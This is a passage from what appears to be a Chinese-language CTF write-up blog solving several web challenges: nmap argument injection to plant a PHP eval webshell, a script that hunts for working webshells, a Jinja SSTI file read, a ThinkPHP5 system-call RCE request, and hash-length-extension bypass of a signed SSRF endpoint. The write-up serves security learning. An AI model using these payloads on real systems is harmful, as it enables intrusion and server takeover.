class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>    <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">&#x27;REMOTE_ADDR&#x27;</span>] = <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>&#125;<br><br><span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;host&#x27;</span>])) &#123;<br>    highlight_file(<span class=\"hljs-keyword\">__FILE__</span>);<br>&#125; <span class=\"hljs-keyword\">else</span> &#123;<br>    <span class=\"hljs-variable\">$host</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;host&#x27;</span>];<br>    <span class=\"hljs-variable\">$host</span> = escapeshellarg(<span class=\"hljs-variable\">$host</span>);<br>    <span class=\"hljs-variable\">$host</span> = escapeshellcmd(<span class=\"hljs-variable\">$host</span>);<br>    <span class=\"hljs-variable\">$sandbox</span> = md5(<span class=\"hljs-string\">&quot;glzjin&quot;</span>. <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&#x27;you are in sandbox &#x27;</span>.<span class=\"hljs-variable\">$sandbox</span>;<br>    @mkdir(<span class=\"hljs-variable\">$sandbox</span>);<br>    chdir(<span class=\"hljs-variable\">$sandbox</span>);<br>    <span class=\"hljs-keyword\">echo</span> system(<span class=\"hljs-string\">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class=\"hljs-variable\">$host</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li>\n<li><p>考点应该是bypass  escapeshellarg和escapeshellcmd以及参数注入</p>\n</li>\n<li><p>nmap的参数注入的话有一个<code>-oG</code>或者<code>-oN</code>或者<code>-o</code>都可以进行写文件操作，接下来就是如何绕过两个函数了</p>\n</li>\n<li><p>[<a href=\"https://mochazz.github.io/2018/07/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day5%20-%20escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93/#%E7%BB%93%E8%AF%AD]\">https://mochazz.github.io/2018/07/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day5%20-%20escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93/#%E7%BB%93%E8%AF%AD]</a>(<a href=\"https://mochazz.github.io/2018/07/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day5\">https://mochazz.github.io/2018/07/30/代码审计Day5</a> - escapeshellarg与escapeshellcmd使用不当/#结语)</p>\n</li>\n<li><p><a href=\"https://paper.seebug.org/164/\">https://paper.seebug.org/164/</a></p>\n</li>\n<li><p>看到了这两个函数公用导致的引号逃逸</p>\n</li>\n<li><p>接下来就是调试payload了，引号这个东西有点难调试</p>\n</li>\n<li><p>最后payload<code>?host=&#39; &lt;?php @eval($_POST[&quot;flag&quot;]);?&gt; -oG flag.php &#39;</code></p>\n</li>\n</ol>\n<h2 id=\"强网杯-2019-高明的黑客\"><a href=\"#强网杯-2019-高明的黑客\" class=\"headerlink\" title=\"[强网杯 2019]高明的黑客\"></a>[强网杯 2019]高明的黑客</h2><ol>\n<li><p>源码中有几千个shell，但是基本都是不能用的，也就是需要我们用脚本找出可以用的shell</p>\n</li>\n<li><p>刚开始写了个垃圾单线程脚本，跑应该是跑的出来的，就是可能要挺久</p>\n</li>\n<li><p>然后尝试写了个多线程的脚本，但是一个一个遍历参数，估计也是要好久</p>\n</li>\n<li><p>网上看到一个比较好的脚本，一个文件只访问一次，把所有参数一次都传过去这样就减少了大部分的请求，在确认某一个文件存在shell之后再遍历所有参数来找到可用参数</p>\n</li>\n<li><p>exp：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> os<br><span class=\"hljs-keyword\">import</span> requests<br><span class=\"hljs-keyword\">import</span> re<br><span class=\"hljs-keyword\">import</span> threading<br><span class=\"hljs-keyword\">import</span> time<br><span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))<br>s1=threading.Semaphore(<span class=\"hljs-number\">100</span>)  \t\t\t\t\t\t\t  \t\t\t<span class=\"hljs-comment\">#这儿设置最大的线程数</span><br>filePath = <span class=\"hljs-string\">r&quot;D:/phpstudy_pro/WWW/src&quot;</span><br>os.chdir(filePath)\t\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\">#改变当前的路径</span><br>requests.adapters.DEFAULT_RETRIES = <span class=\"hljs-number\">5</span>\t\t\t\t\t\t\t\t<span class=\"hljs-comment\">#设置重连次数，防止线程数过高，断开连接</span><br>files = os.listdir(filePath)<br>session = requests.Session()<br>session.keep_alive = <span class=\"hljs-literal\">False</span>\t\t\t\t\t\t\t\t\t\t\t <span class=\"hljs-comment\"># 设置连接活跃状态为False</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">get_content</span>(<span class=\"hljs-params\">file</span>):</span><br>    s1.acquire()\t\t\t\t\t\t\t\t\t\t\t\t<br>    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;trying   &#x27;</span>+file+ <span class=\"hljs-string\">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))<br>    <span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file,encoding=<span class=\"hljs-string\">&#x27;utf-8&#x27;</span>) <span class=\"hljs-keyword\">as</span> f:\t\t\t\t\t\t\t<span class=\"hljs-comment\">#打开php文件，提取所有的$_GET和$_POST的参数</span><br>            gets = <span class=\"hljs-built_in\">list</span>(re.findall(<span class=\"hljs-string\">&#x27;\\$_GET\\[\\&#x27;(.*?)\\&#x27;\\]&#x27;</span>, f.read()))<br>            posts = <span class=\"hljs-built_in\">list</span>(re.findall(<span class=\"hljs-string\">&#x27;\\$_POST\\[\\&#x27;(.*?)\\&#x27;\\]&#x27;</span>, f.read()))<br>    data = &#123;&#125;\t\t\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\">#所有的$_POST</span><br>    params = &#123;&#125;\t\t\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\">#所有的$_GET</span><br>    <span class=\"hljs-keyword\">for</span> m <span class=\"hljs-keyword\">in</span> gets:<br>        params[m] = <span class=\"hljs-string\">&quot;whoami&quot;</span><br>    <span class=\"hljs-keyword\">for</span> n <span class=\"hljs-keyword\">in</span> posts:<br>        data[n] = <span class=\"hljs-string\">&quot;whoami&quot;</span><br>    url = <span class=\"hljs-string\">&#x27;http://127.0.0.1/src/&#x27;</span>+file<br>    req = session.post(url, data=data, params=params)\t\t\t<span class=\"hljs-comment\">#一次性请求所有的GET和POST</span><br>    req.close()\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\"># 关闭请求  释放内存</span><br>    req.encoding = <span class=\"hljs-string\">&#x27;utf-8&#x27;</span><br>    content = req.text<br>    <span class=\"hljs-comment\">#print(content)</span><br>    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;32720&quot;</span> <span class=\"hljs-keyword\">in</span> content:\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\">#如果发现有可以利用的参数，继续筛选出具体的参数</span><br>        flag = <span class=\"hljs-number\">0</span><br>        <span class=\"hljs-keyword\">for</span> a <span class=\"hljs-keyword\">in</span> gets:<br>            req = session.get(url+<span class=\"hljs-string\">&#x27;?%s=&#x27;</span>%a+<span class=\"hljs-string\">&quot;whoami&quot;</span>)<br>            content = req.text<br>            req.close()\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\"># 关闭请求  释放内存</span><br>            <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;32720&quot;</span> <span class=\"hljs-keyword\">in</span> content:<br>                flag = <span class=\"hljs-number\">1</span><br>                <span class=\"hljs-keyword\">break</span><br>        <span class=\"hljs-keyword\">if</span> flag != <span class=\"hljs-number\">1</span>:<br>            <span class=\"hljs-keyword\">for</span> b <span class=\"hljs-keyword\">in</span> posts:<br>                req = session.post(url, data=&#123;b:<span class=\"hljs-string\">&quot;whoami&quot;</span>&#125;)<br>                content = req.text<br>                req.close()\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\"># 关闭请求  释放内存</span><br>                <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;32720&quot;</span> <span class=\"hljs-keyword\">in</span> content:<br>                    <span class=\"hljs-keyword\">break</span><br>        <span class=\"hljs-keyword\">if</span> flag == <span class=\"hljs-number\">1</span>:\t\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span><br>            param = a<br>        <span class=\"hljs-keyword\">else</span>:<br>            param = b<br>        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;找到了利用文件： &#x27;</span>+file+<span class=\"hljs-string\">&quot;  and 找到了利用的参数：%s&quot;</span> %param)<br>        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))<br>    s1.release()<br><br><span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> files:\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\">#加入多线程</span><br>   t = threading.Thread(target=get_content, args=(i,))<br>   t.start()<br><br></code></pre></td></tr></table></figure>\n\n<p>果然还是菜的惨不忍睹</p>\n</li>\n</ol>\n<h2 id=\"BJDCTF-2nd-fake-google\"><a href=\"#BJDCTF-2nd-fake-google\" class=\"headerlink\" title=\"[BJDCTF 2nd]fake google\"></a>[BJDCTF 2nd]fake google</h2><ol>\n<li>测试<code>&lt;script&gt;alert(111)&lt;/script&gt;</code>可以执行</li>\n<li>查看网页源代码提示ssti</li>\n<li>?name=3测试的确存在ssti</li>\n<li>最终payload：<code>?name=&#123;&#123;True.__class__.__mro__[1].__subclasses__()[177].__init__.__globals__.__builtins__['open']('/flag').read()&#125;&#125;</code>直接拿到flag</li>\n</ol>\n<h2 id=\"De1CTF-2019-SSRF-Me\"><a href=\"#De1CTF-2019-SSRF-Me\" class=\"headerlink\" title=\"[De1CTF 2019]SSRF Me\"></a>[De1CTF 2019]SSRF Me</h2><ol>\n<li><p>访问拿到源码，源码审计</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-comment\">#! /usr/bin/env python</span><br><span class=\"hljs-comment\">#encoding=utf-8</span><br><span class=\"hljs-keyword\">from</span> flask <span class=\"hljs-keyword\">import</span> Flask<br><span class=\"hljs-keyword\">from</span> flask <span class=\"hljs-keyword\">import</span> request<br><span class=\"hljs-keyword\">import</span> socket<br><span class=\"hljs-keyword\">import</span> hashlib<br><span class=\"hljs-keyword\">import</span> urllib<br><span class=\"hljs-keyword\">import</span> sys<br><span class=\"hljs-keyword\">import</span> os<br><span class=\"hljs-keyword\">import</span> json<br>reload(sys)<br>sys.setdefaultencoding(<span class=\"hljs-string\">&#x27;latin1&#x27;</span>)<br><br>app = Flask(__name__)<br><br>secert_key = os.urandom(<span class=\"hljs-number\">16</span>)<br><br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Task</span>:</span><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">__init__</span>(<span class=\"hljs-params\">self, action, param, sign, ip</span>):</span><br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">not</span> os.path.exists(self.sandbox)):          <span class=\"hljs-comment\">#SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">Exec</span>(<span class=\"hljs-params\">self</span>):</span><br>        result = &#123;&#125;<br>        result[<span class=\"hljs-string\">&#x27;code&#x27;</span>] = <span class=\"hljs-number\">500</span><br>        <span class=\"hljs-keyword\">if</span> (self.checkSign()):<br>            <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;scan&quot;</span> <span class=\"hljs-keyword\">in</span> self.action:<br>                tmpfile = <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class=\"hljs-string\">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class=\"hljs-keyword\">if</span> (resp == <span class=\"hljs-string\">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class=\"hljs-string\">&#x27;data&#x27;</span>] = resp<br>                <span class=\"hljs-keyword\">else</span>:<br>                    <span class=\"hljs-built_in\">print</span> resp<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                result[<span class=\"hljs-string\">&#x27;code&#x27;</span>] = <span class=\"hljs-number\">200</span><br>            <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;read&quot;</span> <span class=\"hljs-keyword\">in</span> self.action:<br>                f = <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class=\"hljs-string\">&#x27;r&#x27;</span>)<br>                result[<span class=\"hljs-string\">&#x27;code&#x27;</span>] = <span class=\"hljs-number\">200</span><br>                result[<span class=\"hljs-string\">&#x27;data&#x27;</span>] = f.read()<br>            <span class=\"hljs-keyword\">if</span> result[<span class=\"hljs-string\">&#x27;code&#x27;</span>] == <span class=\"hljs-number\">500</span>:<br>                result[<span class=\"hljs-string\">&#x27;data&#x27;</span>] = <span class=\"hljs-string\">&quot;Action Error&quot;</span><br>        <span class=\"hljs-keyword\">else</span>:<br>            result[<span class=\"hljs-string\">&#x27;code&#x27;</span>] = <span class=\"hljs-number\">500</span><br>            result[<span class=\"hljs-string\">&#x27;msg&#x27;</span>] = <span class=\"hljs-string\">&quot;Sign Error&quot;</span><br>        <span class=\"hljs-keyword\">return</span> result<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">checkSign</span>(<span class=\"hljs-params\">self</span>):</span><br>        <span class=\"hljs-keyword\">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">True</span><br>        <span class=\"hljs-keyword\">else</span>:<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">False</span><br><br><br><span class=\"hljs-comment\">#generate Sign For Action Scan.</span><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&quot;/geneSign&quot;</span>, methods=[<span class=\"hljs-string\">&#x27;GET&#x27;</span>, <span class=\"hljs-string\">&#x27;POST&#x27;</span>]</span>)</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">geneSign</span>():</span><br>    param = urllib.unquote(request.args.get(<span class=\"hljs-string\">&quot;param&quot;</span>, <span class=\"hljs-string\">&quot;&quot;</span>))<br>    action = <span class=\"hljs-string\">&quot;scan&quot;</span><br>    <span class=\"hljs-keyword\">return</span> getSign(action, param)<br><br><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/De1ta&#x27;</span>,methods=[<span class=\"hljs-string\">&#x27;GET&#x27;</span>,<span class=\"hljs-string\">&#x27;POST&#x27;</span>]</span>)</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">challenge</span>():</span><br>    action = urllib.unquote(request.cookies.get(<span class=\"hljs-string\">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class=\"hljs-string\">&quot;param&quot;</span>, <span class=\"hljs-string\">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class=\"hljs-string\">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class=\"hljs-keyword\">if</span>(waf(param)):<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class=\"hljs-keyword\">return</span> json.dumps(task.Exec())<br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/&#x27;</span></span>)</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">index</span>():</span><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">&quot;code.txt&quot;</span>,<span class=\"hljs-string\">&quot;r&quot;</span>).read()<br><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">scan</span>(<span class=\"hljs-params\">param</span>):</span><br>    socket.setdefaulttimeout(<span class=\"hljs-number\">1</span>)<br>    <span class=\"hljs-keyword\">try</span>:<br>        <span class=\"hljs-keyword\">return</span> urllib.urlopen(param).read()[:<span class=\"hljs-number\">50</span>]<br>    <span class=\"hljs-keyword\">except</span>:<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&quot;Connection Timeout&quot;</span><br><br><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">getSign</span>(<span class=\"hljs-params\">action, param</span>):</span><br>    <span class=\"hljs-keyword\">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">md5</span>(<span class=\"hljs-params\">content</span>):</span><br>    <span class=\"hljs-keyword\">return</span> hashlib.md5(content).hexdigest()<br><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">waf</span>(<span class=\"hljs-params\">param</span>):</span><br>    check=param.strip().lower()<br>    <span class=\"hljs-keyword\">if</span> check.startswith(<span class=\"hljs-string\">&quot;gopher&quot;</span>) <span class=\"hljs-keyword\">or</span> check.startswith(<span class=\"hljs-string\">&quot;file&quot;</span>):<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">True</span><br>    <span class=\"hljs-keyword\">else</span>:<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">False</span><br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class=\"hljs-literal\">False</span><br>    app.run(host=<span class=\"hljs-string\">&#x27;0.0.0.0&#x27;</span>)<br></code></pre></td></tr></table></figure></li>\n<li><p>可以看到对文件执行操作的有两个，一个scan，一个read，scan把文件写道resault.txt，而read可以读文件。</p>\n</li>\n<li><p>但是要实现读写文件就要突破hash的验证。这里主要有两个方法来突破验证，一个是通过本身的代码来绕过，另外一个是通过hashpumpy工具来绕过</p>\n<ol>\n<li>通过本身代码绕过：<ol>\n<li>因为判断是scan还是read操作用的是<code>in</code>而不是<code>=</code>,所以我们可以传入scanread实现同时操作</li>\n<li>哈希判断：<code>md5(secert_key+param+action)</code>,secert_key是固定的，param和action可控，而<code>/geneSign</code>可以拿到加密后的hash值，当我们传入param=flag.txtread时，等式左边等于<code>md5(secert_key+&#39;flag.txtread&#39;+&#39;scan&#39;)</code>,然后我们访问<code>/De1ta</code>时param=flag.txt&amp;action=readscan,此时两个md5值相等也就绕过了验证，把第一步得到的hash传入第二部即可拿到flag</li>\n</ol>\n</li>\n<li>利用哈希长度拓展攻击hashpumpy工具绕过<ol>\n<li><code>hashpumpy.hashpump(&#39;a36a5ba0e8b9bb78094cbdb641007508&#39;, &#39;scan&#39;, &#39;read&#39;, 24)</code>=&gt;<code>(&#39;ca08c49a467b1e8b465aa6acb96f20f1&#39;, &#39;scan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x00\\x00\\x00read&#39;)</code></li>\n<li>传入param=flag.txt，action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read，sing=ca08c49a467b1e8b465aa6acb96f20f1即可拿到flag</li>\n</ol>\n</li>\n</ol>\n</li>\n</ol>\n<h2 id=\"BJDCTF-2nd-old-hack\"><a href=\"#BJDCTF-2nd-old-hack\" class=\"headerlink\" title=\"[BJDCTF 2nd]old-hack\"></a>[BJDCTF 2nd]old-hack</h2><ol>\n<li><p>打开网站提示THINKPHP5</p>\n</li>\n<li><p><a href=\"https://www.cnblogs.com/nongchaoer/p/12029478.html\">https://www.cnblogs.com/nongchaoer/p/12029478.html</a></p>\n</li>\n<li><p>测试payload：</p>\n<figure class=\"highlight oxygene\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs oxygene\">POST ?s=xxx<br><br><br>_method=__construct&amp;filter[]=system&amp;<span class=\"hljs-function\"><span class=\"hljs-keyword\">method</span>=<span class=\"hljs-title\">get</span>&amp;<span class=\"hljs-title\">server</span>[<span class=\"hljs-title\">REQUEST_METHOD</span>]=<span class=\"hljs-title\">cat</span> /<span class=\"hljs-title\">flag</span></span><br></code></pre></td></tr></table></figure>\n\n<p>拿到flag</p>\n</li>\n</ol>\n<h2 id=\"网鼎杯-2020-青龙组-AreUSerialz\"><a href=\"#网鼎杯-2020-青龙组-AreUSerialz\" class=\"headerlink\" title=\"[网鼎杯 2020 青龙组]AreUSerialz\"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><ol>\n<li><p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-keyword\">include</span>(<span class=\"hljs-string\">&quot;flag.php&quot;</span>);<br><br>highlight_file(<span class=\"hljs-keyword\">__FILE__</span>);<br><br><span 